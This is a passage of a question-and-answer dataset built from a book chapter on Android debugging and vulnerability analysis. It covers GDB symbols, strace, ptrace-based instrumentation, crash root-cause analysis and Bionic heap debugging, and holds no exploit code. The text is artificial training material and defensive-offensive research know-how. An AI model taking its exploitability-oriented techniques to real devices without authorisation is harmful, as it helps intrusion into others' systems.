in\nautomating debugging sessions. Using GDB scripts allows setting up complex,\nproject-specifi c actions such as custom tracing, interdependent breakpoints, and\nmore. More advanced scripting is covered in the sections covering vulnerability\nanalysis later in this chapter.\nDebugging with Symbols\nAbove all else, symbols are the most helpful pieces of information when debug-\nging native code. They encapsulate information that is useful for a human and\ntie it to the code locations in a binary. Recall that symbols for ARM binaries are\nalso used to convey processor mode information to the debugger. Debugging\nwithout symbols, which is covered further in the “Debugging with a Non-AOSP\nDevice” section, can be a terribly painful experience. Whether they are pres-\nent or must be custom built, always seek out and utilize symbols. This section\ndiscusses the nuances of the symbols and provides guidance for how best to\nutilize symbols when debugging native code on Android.\nc07.indd 11:8:41:AM 02/25/2014 Page 235\n236 Chapter 7 ■ Debugging and Analyzing Vulnerabilities\nThe binaries on an Android device contain differing levels of symbolic informa-\ntion. This varies from device to device as well as among the individual binaries\non a single device. Production devices, such as those sold by mobile carriers,\noften do not include any symbols in their binaries. Some devices, including\nNexus devices, have many binaries that contain partial symbols. This is typical\nof a device using a userdebug or eng build of Android. Partial symbols provide\nsome humanly identifi able information, such as function names, but do not\nprovide fi le or line number information. Finally, binaries with full symbols\ncontain extensive information to assist a human who is debugging the code. Full\nsymbols include fi le and line number information, which can be used to enable\nsource-level debugging. In short, diffi culties encountered while debugging native\ncode on Android are inversely proportionate to the level of symbols present.\nObtaining Symbols\nSeveral vendors in the software industry, such as Microsoft and Mozilla, provide\nsymbols to the public via symbol servers. However, no vendors in the Android\nworld provide symbols for their builds. In fact, obtaining symbols for Android\nbuilds typically requires building them from source, which in turn requires a\nfairly beefy build machine. With the exception of a rare engineering build leak\nor the partial symbols present on Nexus devices, custom builds are the only\nway to obtain symbols.\nThankfully, it is possible to build an entire device image for AOSP-supported\ndevices. As part of the build process, fi les containing symbolic information\nare created in parallel to the release fi les. Because some binaries containing\nsymbols are very large, fl ashing them to a device would quickly exhaust the\navailable space of the system. For example, the WebKit library libwebcore.so\nwith symbols is in excess of 450 megabytes. When remote debugging, you can\nutilize these large fi les with symbols in conjunction with the binaries without\nsymbols that are running on the device.\nIn addition to building a full device image, it is also possible to build individual\ncomponents. Taking this route speeds build time and makes the debugging pro-\ncess more effi cient. Using either the make command or the mm built-in from the\nbuild system, you can build only the components that you need. Dependencies\nare built automatically as well. From the top-level AOSP directory, execute make\nor mm with the fi rst argument specifying the desired component. To fi nd a list\nof component names use the following command:\ndev:~/android/source $ find . -name Android.mk -print -exec grep \\\n^'LOCAL_MODULE ' {} \\;\n[...]\n./external/webkit/Android.mk\nLOCAL_MODULE := libwebcore\n[...]\nc07.indd 11:8:41:AM 02/25/2014 Page 236\nChapter 7 ■ Debugging and Analyzing Vulnerabilities 237\nThis outputs the path for each Android.mk fi le, along with any modules defi ned\nby it. As you can see from the excerpt, the libwebcore module is defi ned in the\nexternal/webkit/Android.mk fi le. Therefore, running mm libwebcore builds\nthe desired component. The build system writes the fi le containing symbols to\nsystem/lib/libwebcore.so inside the out/target/product/maguro/symbols\ndirectory. The maguro portion of the path is specifi c to the target device. Building\nfor a different device would use the name of that product instead, such as mako\nfor a Nexus 4.\nMaking Use of Symbols\nAfter you’ve obtained symbols, either using the process just described or via\nother means, putting them to use is the next step. Whether you use gdbclient,\nthe ndk-gdb script, or GDB directly, it is possible to get your newly acquired\nsymbols loaded for a much-improved debugging experience. Although the\nprocess varies slightly for each method, the underlying GDB client is what\nultimately loads and displays the symbols in all cases. Here we explain how\nto get each of these methods to use the symbols you built and discuss ways to\nimprove symbol loading further.\nThe gdbclient built-in provided by AOSP automatically uses symbols if\nthey’ve been built. It obtains the path to the built symbols using the Android\nbuild system and instructs the GDB client to look there. Unfortunately, gdb-\nclient uses symbols for all modules present, which is nearly all modules in a\ndefault build. Due to the sheer size of modules with symbols, this can be quite\nslow. It is rarely necessary to load the symbols for all modules.\nWhen debugging with the NDK alone, the ndk-gdb script also supports loading\nsymbols automatically. Unlike the gdbclient built-in, the ndk-gdb script pulls\nthe app_process, linker, and libc.so fi les directly from the target device itself.\nRecall that these binaries typically have only partial symbols. One would think\nthat replacing these fi les with custom-built binaries with full symbols would\nimprove the situation. Unfortunately, ndk-gdb overwrites the existing fi les if\nthey already exist. To avoid this behavior, simply comment out the lines start-\ning with run adb_cmd pull. After doing so, ndk-gdb uses the binaries with full\nsymbols. Because only a few fi les with symbols are present, using ndk-gdb is\ngenerally quite fast compared to using gdbclient. Still, we prefer to have more\ncontrol over exactly which symbols are loaded.\nAs discussed in depth in the “Debugging with AOSP” and “Increasing\nAutomation” sections earlier in this chapter, invoking the AOSP GDB client\ndirectly is our preferred method for debugging native code. Using this method\nprovides the most control over what happens, both on the target device and\nwithin the GDB client itself. It also allows managing project-specifi c confi gu-\nration details that are useful when engaging in several different debugging\nprojects simultaneously. The rest of this section outlines how to set up such an\nenvironment and create an optimized Android browser debugging experience.\nc07.indd 11:8:41:AM 02/25/2014 Page 237\n238 Chapter 7 ■ Debugging and Analyzing Vulnerabilities\nThe fi rst step to creating an optimized, project-specifi c debugging environ-\nment is creating a directory to hold your project specifi c data. For the purposes\nof this demonstration, create the gn-browser-dbg directory inside the AOSP\nroot directory:\ndev:~/android/source $ mkdir -p gn-browser-dbg && cd $_\ndev:gn-browser-dbg $\nNext, create symbolic links to the modules for which you want to load symbols.\nRather than use the entire symbols directory, as the gdbclient built-in does,\nuse the current directory combined with these symbolic links. Loading all of\nthe symbols is wasteful, time consuming, and often unnecessary. Although\nstoring the symbol fi les on a blazing fast SSD or RAM drive helps, it’s only a\nmarginal improvement. To speed the process, you want to load symbols for a\nlimited set of modules:\ndev:gn-browser-dbg $ ln -s ../out/target/product/maguro/symbols\ndev:gn-browser-dbg $ ln -s symbols/system/bin/linker\ndev:gn-browser-dbg $ ln -s symbols/system/bin/app_process\ndev:gn-browser-dbg $ ln -s symbols/system/lib/libc.so\ndev:gn-browser-dbg $ ln -s symbols/system/lib/libwebcore.so\ndev:gn-browser-dbg $ ln -s symbols/system/lib/libstdc++.so\ndev:gn-browser-dbg $ ln -s symbols/system/lib/libdvm.so\ndev:gn-browser-dbg $ ln -s symbols/system/lib/libutils.so\ndev:gn-browser-dbg $ ln -s symbols/system/lib/libandroid_runtime.so\nHere you fi rst create a symbolic link to the symbols directory itself. Then\nyou create symbolic links from within it for the core system fi les as well as\nlibwebcore.so (WebKit), libstdc++.so, and libdvm.so (the Dalvik VM).\nWith your directory and symbolic links created, the next step is to create\nthe GDB script. This script serves as the basis for your debugging project and\nenables you to include more advanced scripts directly inside. You only need\ntwo commands to get started:\ndev:gn-browser-dbg $ cat > script.gdb\n# tell gdb where to find symbols\nset solib-search-path .\ntarget remote 127.0.0.1:31337\n^D\ndev:gn-browser-dbg $\nThe fi rst command, as the comment indicates, tells the GDB client to look in\nthe current directory for fi les with symbols. The GDB server indicates which\nmodules are loaded and the GDB client loads modules accordingly. The second\ncommand should be familiar. It instructs the GDB client where to fi nd the wait-\ning GDB server.\nFinally, you are ready to run everything to see how well it works. The next\nexcerpt shows this minimal debug confi guration in action.\nc07.indd 11:8:41:AM 02/25/2014 Page 238\nChapter 7 ■ Debugging and Analyzing Vulnerabilities 239\ndev:gn-browser-dbg $ arm-eabi-gdb -q -x script.gdb app_process\nReading symbols from /android/source/gn-browser-dbg/app_process...done.\nwarning: Could not load shared library symbols for 86 libraries, e.g. libm.\nso.\nUse the \"info sharedlibrary\" command to see the complete listing.\nDo you need \"set solib-search-path\" or \"set sysroot\"?\nwarning: Breakpoint address adjusted from 0x40079b79 to 0x40079b78.\nepoll_wait () at bionic/libc/arch-arm/syscalls/epoll_wait.S:10\n10 mov r7, ip\n(gdb) back\n#0 epoll_wait () at bionic/libc/arch-arm/syscalls/epoll_wait.S:10\n#1 0x400d1fcc in android::Looper::pollInner (this=0x415874c8,\ntimeoutMillis=<optimized\nout>)\nat frameworks/native/libs/utils/Looper.cpp:218\n#2 0x400d21f0 in android::Looper::pollOnce (this=0x415874c8,\ntimeoutMillis=-1,\noutFd=0x0, outEvents=0x0, outData=0x0)\nat frameworks/native/libs/utils/Looper.cpp:189\n#3 0x40209c68 in pollOnce (timeoutMillis=<optimized out>,\nthis=<optimized out>) at frameworks/native/include/utils/Looper.h:176\n#4 android::NativeMessageQueue::pollOnce (this=0x417fdb10, env=0x416d1d90,\ntimeoutMillis=<optimized out>)\nat frameworks/base/core/jni/android_os_MessageQueue.cpp:97\n#5 0x4099bc50 in dvmPlatformInvoke () at dalvik/vm/arch/arm/CallEABI.S:258\n#6 0x409cbed2 in dvmCallJNIMethod (args=0x579f9e18, pResult=0x417841d0,\nmethod=0x57b57860, self=0x417841c0)\nat dalvik/vm/Jni.cpp:1185\n#7 0x409a5064 in dalvik_mterp () at\ndalvik/vm/mterp/out/InterpAsm-armv7-a-neon.S:16240\n#8 0x409a95f0 in dvmInterpret (self=0x417841c0, method=0x57b679b8,\npResult=0xbec947d0) at dalvik/vm/interp/Interp.cpp:1956\n#9 0x409de1e2 in dvmInvokeMethod (obj=<optimized out>, method=0x57b679b8,\nargList=<optimized out>, params=<optimized out>,\nreturnType=0x418292a8, noAccessCheck=false) at\ndalvik/vm/interp/Stack.cpp:737\n#10 0x409e5de2 in Dalvik_java_lang_reflect_Method_invokeNative\n(args=<optimized\nout>, pResult=0x417841d0)\nat dalvik/vm/native/java_lang_reflect_Method.cpp:101\n#11 0x409a5064 in dalvik_mterp () at\ndalvik/vm/mterp/out/InterpAsm-armv7-a-neon.S:16240\n#12 0x409a95f0 in dvmInterpret (self=0x417841c0, method=0x57b5cc30,\npResult=0xbec94960)\nat dalvik/vm/interp/Interp.cpp:1956\n#13 0x409ddf24 in dvmCallMethodV (self=0x417841c0, method=0x57b5cc30,\nobj=<optimized out>, fromJni=<optimized out>,\npResult=0xbec94960, args=...) at dalvik/vm/interp/Stack.cpp:526\n#14 0x409c7b6a in CallStaticVoidMethodV (env=<optimized out>,\njclazz=<optimized\nout>, methodID=0x57b5cc30, args=<optimized out>)\nat dalvik/vm/Jni.cpp:2122\n#15 0x401ed698 in _JNIEnv::CallStaticVoidMethod (this=<optimized out>,\nclazz=<optimized out>, methodID=0x57b5cc30)\nat libnativehelper/include/nativehelper/jni.h:780\n#16 0x401ee32a in android::AndroidRuntime::start (this=<optimized out>,\nclassName=0x4000d3a4 \"com.android.internal.os.ZygoteInit\",\noptions=<optimized out>) at frameworks/base/core/jni/AndroidRuntime.\nc07.indd 11:8:41:AM 02/25/2014 Page 239\n240 Chapter 7 ■ Debugging and Analyzing Vulnerabilities\ncpp:884\n#17 0x4000d05e in main (argc=4, argv=0xbec94b38) at\nframeworks/base/cmds/app_process/app_main.cpp:231\n(gdb)\nIt takes quite a while to load the symbols from libwebcore.so because it is\nso large. Using an SSD or a RAM disk helps tremendously. As seen from the\npreceding excerpt, full symbols are being used. Function names, source fi les,\nline numbers, and even function arguments are displayed.\nDebugging at Source Level\nThe holy grail of interactive debugging is being able to work at the source level.\nThankfully this is possible by using an AOSP checkout and an AOSP-supported\nNexus device. If you follow the steps outlined in the previous sections from\nstart to fi nish, the custom-built binaries that contain symbols will already enable\nsource-level debugging. Seeing this in action is as simple as executing a few\ncommands inside the GDB client, as shown in the following excerpt:\n# after attaching, as before\nepoll_wait () at bionic/libc/arch-arm/syscalls/epoll_wait.S:10\n10 mov r7, ip\n(gdb) list\n5\n6 ENTRY(epoll_wait)\n7 mov ip, r7\n8 ldr r7, =__NR_epoll_wait\n9 swi #0\n10 mov r7, ip\n11 cmn r0, #(MAX_ERRNO + 1)\n12 bxls lr\n13 neg r0, r0\n14 b __set_errno\n(gdb) up\n#1 0x400d1fcc in android::Looper::pollInner (this=0x41591308,\ntimeoutMillis=<optimized out>)\nat frameworks/native/libs/utils/Looper.cpp:218\n218 int eventCount = epoll_wait(mEpollFd, eventItems, EPOLL_MAX_\nEVENTS,\ntimeoutMillis);\n(gdb) list\n213 int result = ALOOPER_POLL_WAKE;\n214 mResponses.clear();\n215 mResponseIndex = 0;\n216\n217 struct epoll_event eventItems[EPOLL_MAX_EVENTS];\n218 int eventCount = epoll_wait(mEpollFd, eventItems, EPOLL_MAX_\nEVENTS,\ntimeoutMillis);\n219\n220 // Acquire lock.\n221 mLock.lock();\n222\nc07.indd 11:8:41:AM 02/25/2014 Page 240\nChapter 7 ■ Debugging and Analyzing Vulnerabilities 241\n(gdb)\nHere you are able to see both assembly and C++ source code for two frames\nin the call stack after you attach. GDB’s list command shows the 10 lines\nsurrounding the code location corresponding to that frame. The up command\nmoves upward through the call stack (to calling frames), and the down command\nmoves downward.\nIf the symbols were built on a different machine or the source code had been\nmoved since building the symbols, the source code may not display. Instead, an\nerror message such as that in the following excerpt is shown:\n(gdb) up\n#1 0x400d1fcc in android::Looper::pollInner (this=0x415874c8,\ntimeoutMillis=<optimized out>)\nat frameworks/native/libs/utils/Looper.cpp:218\n218 frameworks/native/libs/utils/Looper.cpp: No such file or directory.\nin frameworks/native/libs/utils/Looper.cpp\n(gdb)\nTo remedy this situation, create symbolic links to the location on the fi le system\nwhere the source resides. The following excerpt shows the necessary commands:\ndev:gn-browser-dbg $ ln -s ~/android/source/bionic\ndev:gn-browser-dbg $ ln -s ~/android/source/dalvik\ndev:gn-browser-dbg $ ln -s ~/android/source/external\nWith this done, source-level debugging should be restored. At this point you\nare able to view source code inside GDB, create breakpoints based on source\nlocations, display structures in prettifi ed form, and more.\n(gdb) break 'WebCore::RenderObject::layoutIfNeeded()'\nBreakpoint 1 at 0x5d3a3e44: file\nexternal/webkit/Source/WebCore/rendering/RenderObject.h, line 524.\n(gdb) cont\nContinuing.\nWhenever the browser renders a page, this breakpoint is hit. From that con-\ntext, you can inspect the state of the RenderObject and begin to deduce what\nis happening. These objects are discussed more in Chapter 8.\nDebugging with a Non-AOSP Device\nOn occasion, it is necessary to debug code running on a device that is not sup-\nported by AOSP. Perhaps the buggy code is not present on any AOSP-supported\ndevices or differs from that found in AOSP. The latter is often the case when\ndealing with devices sold directly by original equipment manufacturers (OEMs)\nor carriers. The modifi cations made within the OEM’s development ranks may\nintroduce issues not present in AOSP. Unfortunately, debugging on these devices\nis far more troublesome.\nc07.indd 11:8:41:AM 02/25/2014 Page 241\n242 Chapter 7 ■ Debugging and Analyzing Vulnerabilities\nThere are several challenges that present themselves when one tries to debug\non these devices. Most of these challenges are hinged on two main issues.\nFirst, it can be diffi cult to know exactly which toolchain was used to build the\ndevice. OEMs may opt to use commercial toolchains, ancient versions of public\ntoolchains, or even custom modifi ed toolchains. Even after successfully deter-\nmining which toolchain was used, it may not be possible to obtain it. Using the\ncorrect toolchain is important because some toolchains are not compatible with\neach other. Differences in GDB protocol support, for example, could cause the\nGDB client to encounter errors or even crash. Second, non-AOSP devices rarely\ncontain any type of symbols, and building them yourself without access to the\nfull build environment is impossible. In addition to function name, source fi le,\nand line number information being unavailable, the important ARM-specifi c\nsymbols that indicate processor mode will be missing. This makes it diffi cult\nto determine which processor mode a particular code location is in, which in\nturn leads to problems setting breakpoints and examining call stacks.\nThe overall workfl ow for debugging a non-Nexus device is quite similar to\nthat of a Nexus device. Following the steps in the “Debugging with AOSP”\nsection earlier in this chapter should produce the desired result.\nAccomplishing the fi rst step of fi nding a GDB server and GDB client that\nwill work can be diffi cult in itself. It may require experimenting with several\ndifferent versions of these programs. If you are able to determine the toolchain\nused to build the device’s binaries, using the GDB server and client from that\ntoolchain is likely to produce the best results. After this step is accomplished,\nyou can forge ahead bravely.\nWithout symbols, GDB has no way of knowing which areas of binaries are\nThumb code and which are ARM code. Therefore, it cannot automatically deter-\nmine how to disassemble or set breakpoints. You can work around this problem\nby using static analysis tools to reverse-engineer the code. Also, GDB provides\naccess to the Current Program Status Register (CPSR) register. Checking the fi fth\nbit in this register indicates whether the processor is in ARM mode or Thumb\nmode. Once you determine that the debugger is in a Thumb mode function, use\nthe set arm fallback-mode or set arm force-mode commands with a value of\nthumb. This tells GDB how to treat the function. When setting breakpoints in a\nThumb function, always add one to the address. This tells GDB that the address\nrefers to a Thumb instruction, which will change how it inserts breakpoints.\nIt’s also possible to use the CPSR register directly to set breakpoints, as shown\nhere:\n(gdb) break 0x400c0e88 + (($cpsr>>5)&1)\nTake care when using this method because there is no guarantee that the target\nfunction executes in the same mode as the context your debugger is currently\nin. In any case, you have a 50 percent chance of being correct. If the breakpoint\nc07.indd 11:8:41:AM 02/25/2014 Page 242\nChapter 7 ■ Debugging and Analyzing Vulnerabilities 243\nis not hit or the target process encounters an error after setting your breakpoint,\nchances are the breakpoint was created in the wrong mode.\nEven armed (no pun intended) with these techniques, debugging non-AOSP\ndevices is still unpredictable. Your mileage may vary.\nDebugging Mixed Code\nThe Android operating system is an amalgamation of native and Dalvik code.\nWithin the Android framework, many code paths traverse from Dalvik code into\nnative code. Some code even calls back into the Dalvik VM from native code.\nSeeing and being able to step through the entire code path can be especially\nuseful when debugging mixed code. In particular, viewing the call stack in its\nentirety is very helpful.\nThankfully, debugging both Dalvik and native code inside Eclipse works fairly\nwell. There are some occasional hiccups, but it is possible to place breakpoints\nin both types of code. When either kind of breakpoint is reached, Eclipse cor-\nrectly pauses execution and provides an interactive debugging experience. To\nachieve mixed code debugging, combine all of the techniques presented in the\n“Debugging Dalvik Code” and “Debugging Native Code” sections earlier in\nthe chapter. Be sure to use the Android Native Application debugging profi le\nwhen launching your debug session from within Eclipse.\nAlternative Debugging Techniques\nAlthough interactive methods are best method for tracing data fl ow or confi rm-\ning hypotheses, several other methods can replace or augment the debugging\nprocess. Inserting debugging statements into source code is one popular way\nto spot-check code coverage or trace variable contents. Debugging on the device\nitself, whether using a custom debugger or GDB binary built for ARM, also has\nits place. Finally, sensitive timing issues may bring the need to employ advanced\ntechniques like instrumentation. This section discusses the advantages and\ndisadvantages of these methods.\nDebug Statements\nOne of the oldest methods for debugging a program includes inserting debug\nstatements directly into the source code. This works for both Dalvik and native\nC/C++ code. Unfortunately, this technique is not applicable when source code is\nnot available. Even when source code is handy, this method requires rebuilding\nand redeploying the resulting binary onto the device. In some cases, a reboot\nc07.indd 11:8:41:AM 02/25/2014 Page 243\n244 Chapter 7 ■ Debugging and Analyzing Vulnerabilities\nmay be required to reload the target code. Also, extra porting effort may be\nnecessary when migrating debug statements to new versions of the source code.\nAlthough these disadvantages amount to a high up-front cost, the debug state-\nments themselves have very little runtime cost. Additionally, inserting debug\nstatements is a great way to concretely tie the source code to what is happening\nat runtime. All in all, this tried-and-true method is a viable option for tracking\ndown bugs and making sense of a program.\nOn-Device Debugging\nAlthough remote debugging is the de facto standard for debugging embed-\nded devices like Android phones, on-device methods can avoid some of the\npitfalls involved. For one, remote debugging can be signifi cantly slower than\ndebugging on the device itself. This is due to the fact that every debug event\nrequires a round trip from the device to the host machine debugger and back\nagain. Remote debugging can be especially slow for conditional breakpoints,\nwhich use an extra round trip to determine if the condition is satisfi ed. Also,\ndebugging on the device itself alleviates the need for a host computer in some\ncases. There are a variety of ways that one can do debugging on-device. This\nsection presents a few such methods.\nstrace\nThe strace utility can be a godsend when you’re trying to debug odd behaviors.\nThis tool provides tracing capabilities at the system-call level, which explains its\nname. Debugging at this level lets you easily see from where unexplained “no\nsuch fi le or directory” errors are stemming. It’s also useful to see exactly what\nsystem calls are executed leading up to a crash. The strace tool supports start-\ning new processes as well as attaching to existing ones. Attaching to existing\nprocesses can be especially useful for seeing where a process may be hung or\nconfi rming that network or Interprocess Communication (IPC) communications\nare indeed occurring.\nThe strace tool is included in AOSP and is compiled as part of a userdebug\nbuild. However, the tool is not part of the default installation image in this\nconfi guration. To push the binary to your device, execute something similar\nto the following:\ndev:~/android/source $ adb push \\\nout/target/product/maguro/obj/EXECUTABLES/strace_intermediates/LINKED/\nstrace \\\n/data/local/tmp/\n656 KB/s (625148 bytes in 0.929s)\nThis example is from our build environment for the Galaxy Nexus. This\nbinary should be usable on just about any ARMv7 capable device.\nc07.indd 11:8:41:AM 02/25/2014 Page 244\nChapter 7 ■ Debugging and Analyzing Vulnerabilities 245\nCustom GDB Builds\nBeing able to run GDB natively on an Android device would be ideal. Unfortunately,\nGDB doesn’t directly support Android and porting GDB to work on Android\nnatively is not straightforward. Several individuals have tried to create a native\nAndroid GDB binary. Some have even declared success. For one, Alfredo Ortega\nhosts binaries for versions 6.7 and 6.8 of GDB on his site at https://sites\n.google.com/site/ortegaalfredo/android. Another method involves follow-\ning the instructions for using Debootstrap from the Debian Project at https://\nwiki.debian.org/ChrootOnAndroid. Unfortunately, both of these GDB binaries\nlack support for Android’s thread implementation and only debug the main\nthread of processes.\nNOTE When using the Debootstrap version of GDB, follow the instructions for run-\nning binaries inside the chroot from outside using ld.so. Also, add /system/lib to\nthe beginning of LD_LIBRARY_PATH to fi x symbol resolution.\nWriting a Custom Debugger\nAll the tools for debugging native code described in this chapter are built upon\nthe ptrace API. The ptrace API is a standard Unix API for debugging processes.\nAs this API is implemented as a system call in the Linux kernel, it is present\non nearly all Linux systems. Only in rare circumstances, such as some Google\nTV devices, is ptrace disabled. Using this API directly enables researchers to\ndevelop powerful custom debuggers that do not depend on GDB being pres-\nent. For example, several of the tools created by authors of this book depend\non ptrace. These tools run directly on devices and often execute much quicker\nthan GDB (even on-device GDB).\nDynamic Binary Instrumentation\nEven when debuggers are working at their best, they can introduce issues. Using\na large number of tracing breakpoints can make the debugging experience\npainfully slow. Putting breakpoints on time-critical areas of code can infl uence\nprogram behavior and complicate exploit development. This is where another\nexcellent technique comes into play.\nDynamic Binary Instrumentation (DBI) is a method by which additional code is\ninserted into a program’s normal fl ow. This technique is also commonly called\nhooking. The general process starts by crafting some custom code and injecting\nit into the target process. Like breakpoints, DBI involves overwriting interest-\ning code locations. However, instead of inserting a breakpoint instruction, DBI\ninserts instructions to redirect the execution fl ow into the injected custom code.\nc07.indd 11:8:41:AM 02/25/2014 Page 245"
  },
  {
    "input": "What is the process for determining the root cause and judging the exploitability of a memory corruption vulnerability in Android?",
    "summary": "This chapter discusses debugging and analyzing vulnerabilities on Android, focusing on memory corruption issues. It explains techniques like dynamic binary instrumentation (DBI) and using ptrace for efficient debugging, as well as methods for determining the root cause of vulnerabilities and assessing their exploitability. A detailed example is provided of analyzing a crash in the Android Browser caused by a use-after-free vulnerability, highlighting the importance of understanding the underlying issue to effectively address or exploit it. The chapter also covers tools and strategies for identifying and fixing such vulnerabilities.",
    "output": "246 Chapter 7 ■ Debugging and Analyzing Vulnerabilities\nUsing this method greatly increases performance by eliminating unnecessary\ncontext switches. Further, the injected custom code has direct access to the\nprocess’s memory, eliminating the need to suffer additional context switches\nto obtain memory contents (as with ptrace).\nNOTE DBI is a powerful technique that has uses beyond debugging. It can also be\nused to hot-patch vulnerabilities, extend functionality, expose new interfaces into\nexisting code for testing purposes, and more.\nSeveral tools written by authors of this book utilize DBI in conjunction with\nthe ptrace API. Collin Mulliner’s Android Dynamic Binary Instrumentation\nToolkit (adbi) and Georg Wicherski’s AndroProbe both use ptrace to inject cus-\ntom code, albeit for different purposes. Collin’s toolkit can be found at https://\ngithub.com/crmulliner/adbi.\nVulnerability Analysis\nIn information security, the term vulnerability analysis is generally defi ned as\nan organized effort to discover, classify, and understand potentially dangerous\nissues in systems. By this defi nition, vulnerability analysis encompasses almost\nthe entire information security industry. Breaking this topic down further, there\nare many different techniques and processes that researchers and analysts apply\nto reach their ultimate goal of understanding weaknesses. Whether individual\ngoals are defensive or offensive in nature, the steps to get there are very similar.\nThe rest of this chapter focuses on one small area of vulnerability analysis;\nanalyzing crashes that result from memory corruption vulnerabilities. Further,\nthis section uses the debugging techniques presented in this chapter to bridge\nthe gap between Chapter 6 and Chapter 8. As a result of this type of analysis,\nresearchers gain a deep understanding of the underlying vulnerability, includ-\ning its cause and potential impact.\nThe task of analyzing memory corruption vulnerabilities, whether for reme-\ndiation or exploitation, can be challenging. When executing this task, there\nare two primary goals; determining the root cause and judging exploitability.\nDetermining Root Cause\nFaced with a potentially exploitable memory corruption vulnerability, the fi rst\ngoal is to determine the root cause of the bug. Like other information security\nconcepts, there are several levels of specifi city when discussing root cause. For\nthe purposes of crash analysis, we consider the root cause to be the fi rst occur-\nrence of ill behavior that results in a vulnerable condition.\nc07.indd 11:8:41:AM 02/25/2014 Page 246\nChapter 7 ■ Debugging and Analyzing Vulnerabilities 247\nNOTE There are many diff erent types of memory corruption that can result from\nundefi ned behavior. MITRE’s Common Weakness Enumeration (CWE) project cata-\nlogs this type of information and much more at http://cwe.mitre.org/data/\nindex.html.\nThese ill behaviors are often due to a concept born in programming language\nspecifi cations, undefi ned behavior. This term refers to any behaviors that are not\ndefi ned by the specifi cation due to differences in low-level architectures, memory\nmodels, or corner cases. The C and C++ programming language specifi cations\ndefi ne a multitude of behaviors as undefi ned. In theory, undefi ned behavior\ncould result in just about anything happening. Examples include correct behav-\nior, intentionally crashing, and subtle memory corruption. These behaviors\nrepresent a very interesting area for researchers to study.\nCorrectly determining the root cause of a vulnerability is perhaps the most\nimportant task in vulnerability analysis. For defenders, failing to correctly iden-\ntify and understand root cause may lead to an insuffi cient fi x for the issue. For\nattackers, understanding the root cause is only the fi rst step in a lengthy process.\nIf either party wants to prioritize a particular issue according to exploitability,\na proper root cause analysis is essential. Thankfully, there are many tricks of\nthe trade and helpful tools that can assist in accomplishing this goal.\nTips and Tricks\nThere are many tips and tricks to learn to be great at getting to the root causes\nof vulnerabilities. We present only a few such techniques here. The exact tech-\nniques that apply depend highly on how the ill behavior was discovered. Fuzzing\nlends itself to reducing and comparing inputs. Operating systems, including\nAndroid, contain facilities to assist debugging. Debuggers are a crucial piece;\nuse their features to your full advantage. In the end, the root cause lies in the\ncode itself. These techniques help make the process of isolating that code loca-\ntion quicker and easier.\nComparing and Minimizing Inputs\nRecall that fuzzing boils down to automatically generating and testing inputs.\nThe bulk of the challenge begins after an input that causes ill behavior is found.\nAnalyzing the input itself provides immense insight into what is going wrong.\nWith mutation fuzzing in particular, comparing the mutated input to the\noriginal input reveals the exact changes made. For example, consider an input\nfrom a fi le format fuzzing session where only one byte is changed. A simple\ndifferential analysis of the two fi les might show which byte was changed and\nwhat the value was before and after. However, processing both inputs with a\nverbose parser shows semantics of changes. That is, it would show that the byte\nc07.indd 11:8:41:AM 02/25/2014 Page 247\n248 Chapter 7 ■ Debugging and Analyzing Vulnerabilities\nchanged is actually a length value in a tag-length-value (TLV) type of fi le struc-\nture. Further, it would reveal which tag it was associated with. This semantic\ninformation gives a researcher an indicator where to look in the code.\nMinimizing the test input is helpful whether fuzz inputs were mutated or\ngenerated. Two techniques for minimization are reverting changes and elimi-\nnating unnecessary parts of the input. Reverting changes helps isolate exactly\nwhich change is causing the ill behavior. Eliminating the parts of the input\nthat doesn’t change a test’s results means one less thing to look at. Consider\nthe previous example from comparing inputs. If there are thousands of data\nblocks that contain the same tag value, analysis may be hampered due to hit-\nting the breakpoint thousands of times. Eliminating unnecessary data blocks\nreduces the breakpoint hit count to only one. Like comparing inputs, minimiz-\ning benefi ts greatly from semantic information. Breaking down a fi le format\ninto its hierarchal components and removing them at different levels speeds\nthe minimization process.\nThese two techniques, although powerful, are less applicable outside of fuzz-\ning. Other techniques apply to a wider range of analysis scenarios and thus are\nmore generic.\nAndroid Heap Debugging\nAndroid’s Bionic C runtime library contains built-in heap debugging tools.\nThis feature is briefl y discussed at http://source.android.com/devices/\nnative-memory.html. It is controlled by the libc.debug.malloc system property.\nAs mentioned on the aforementioned website, enabling this facility for processes\nspawned from Zygote (like the browser) requires restarting the entire Dalvik\nruntime. How to do that is covered in the “Faking a Debug Device” section\nearlier in this chapter.\nThrough this variable, Android supports four strategies for debugging things\nthat might go wrong with heap memory. The malloc_debug_common.cpp fi le\ninside the bionic/libc/bionic directory of AOSP contains more details:\n455 // Initialize malloc dispatch table with appropriate routines.\n456 switch (debug_level) {\n457 case 1:\n458 InitMalloc(&gMallocUse, debug_level, \"leak\");\n459 break;\n460 case 5:\n461 InitMalloc(&gMallocUse, debug_level, \"fill\");\n462 break;\n463 case 10:\n464 InitMalloc(&gMallocUse, debug_level, \"chk\");\n465 break;\n466 case 20:\n467 InitMalloc(&gMallocUse, debug_level, \"qemu_instrumented\");\n468 break;\nc07.indd 11:8:41:AM 02/25/2014 Page 248\nChapter 7 ■ Debugging and Analyzing Vulnerabilities 249\nEarlier in this fi le, a comment explains the purpose of each of the different\nstrategies. The notable exception is that the fourth option, qemu_instrumented,\nis not mentioned. This is because that option is actually implemented in the\nemulator itself.\n262 * 1 - For memory leak detections.\n263 * 5 - For filling allocated / freed memory with patterns defined by\n264 * CHK_SENTINEL_VALUE, and CHK_FILL_FREE macros.\n265 * 10 - For adding pre-, and post- allocation stubs in order to detect\n266 * buffer overruns.\nIn addition to requiring root access to set the relevant properties, it is nec-\nessary to put the libc_malloc_debug_leak.so library into the /system/lib\ndirectory. Doing so requires remounting the /system partition in read/write\nmode temporarily. This library is in the out/target/product/maguro/obj/lib\ndirectory inside the AOSP build output. The following excerpt shows the setup\nprocess in action:\ndev:~/android/source $ adb push \\\nout/target/product/maguro/obj/lib/libc_malloc_debug_leak.so /data/local/tmp\n587 KB/s (265320 bytes in 0.440s)\ndev:~/android/source $ adb shell\nshell@maguro:/ $ su\nroot@maguro:/ # mount -o remount,rw /system\nroot@maguro:/ # cat /data/local/tmp/libc_malloc_debug_leak.so > \\\n/system/lib/libc_malloc_debug_leak.so\nroot@maguro:/ # mount -o remount,ro /system\nroot@maguro:/ # setprop libc.debug.malloc 5\nroot@maguro:/ # cd /data/local/tmp\nroot@maguro:/data/local/tmp # ps | grep system_server\nsystem 379 125 623500 99200 ffffffff 40199304 S system_server\nroot@maguro:/data/local/tmp # kill -9 379\nroot@maguro:/data/local/tmp # logcat -d | grep -i debug\nI/libc ( 2994): /system/bin/bootanimation: using libc.debug.malloc 